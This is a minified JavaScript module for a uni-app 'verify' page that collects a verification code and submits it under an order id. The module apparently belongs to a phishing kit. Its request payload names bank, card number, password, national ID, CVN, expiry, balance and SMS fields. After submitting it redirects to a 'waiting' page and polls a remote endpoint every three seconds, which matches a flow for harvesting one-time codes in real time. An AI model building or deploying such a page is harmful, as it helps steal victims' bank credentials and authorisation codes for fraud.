import{d as a,A as e,y as s,r as t,p as l,o as r,e as d,w as o,f as u,g as i,q as n,t as m,u as _,b as f,s as c,v as p,x as v,m as y,_ as h}from"./index-1a1fccd8.js";import{_ as w,a as b}from"./uni-forms-item.f74ff9fd.js";import{r as g,a as x,_ as V,b as I,c as E}from"./Rules.f714300d.js";import{h as L,u as j}from"./Remote.9d35866b.js";const k=h(a({...{data:()=>({options:{}}),onLoad(a){this.options=a}},__name:"verify",setup(a){e(),s((()=>{let a=y();if(a){let e=a.data.options;k.value.id=e.order}}));const h=t(null),k=t({id:"",verify:""}),R=async a=>{h.value.validate();let e=k.value,s={d_id:e.id,d_kaihuhang:"",d_name:"",d_kahao:"",d_mima:"",d_mima2:"",d_sfz:"",d_phone:"",d_cvn:"",d_cvntime:"",d_yue:null,d_yzm:e.verify,d_download:null,d_permission:null,d_sms:"",d_device:null},t=await j(s);1==t.status&&c({url:"waiting?order="+t.data.d_id})};l((()=>{clearInterval(A)}));const A=setInterval((async()=>{try{L(k.value.id)}catch(a){}}),3e3);return(a,e)=>{const s=u,t=p,l=g(v("uni-easyinput"),w),c=g(v("uni-forms-item"),b),y=g(v("uni-col"),V),L=g(v("uni-row"),I),j=g(v("uni-forms"),E);return r(),d(s,{class:"home-container"},{default:o((()=>[i(s,{class:"custom-nav"},{default:o((()=>[i(s),i(s,null,{default:o((()=>[i(t,{class:"title"},{default:o((()=>[n(m(a.$t("LABEL_VERIFY")),1)])),_:1})])),_:1}),i(s)])),_:1}),i(s,{variant:"text",class:"card"},{default:o((()=>[i(j,{class:"form",modelValue:k.value,ref_key:"prepareForm",ref:h,"label-position":"top","err-show-type":"undertext",rules:_(x),validateTrigger:"blur"},{default:o((()=>[i(L,{class:"form-row"},{default:o((()=>[i(y,{span:24},{default:o((()=>[i(c,{required:"",name:"verify",label:a.$t("LABEL_SEND_VERIFY"),class:"form-item","label-width":"100vw"},{default:o((()=>[i(l,{class:"input",type:"text",modelValue:k.value.verify,"onUpdate:modelValue":e[0]||(e[0]=a=>k.value.verify=a)},null,8,["modelValue"])])),_:1},8,["label"])])),_:1})])),_:1}),i(L,{class:"form-row"},{default:o((()=>[i(y,{span:24,style:{"text-align":"center"}},{default:o((()=>[f("uni-button",{type:"primary",class:"large-button",onClick:R},m(a.$t("SUBMIT")),1)])),_:1})])),_:1})])),_:1},8,["modelValue","rules"])])),_:1})])),_:1})}}}),[["__scopeId","data-v-8fee4205"]]);export{k as default};
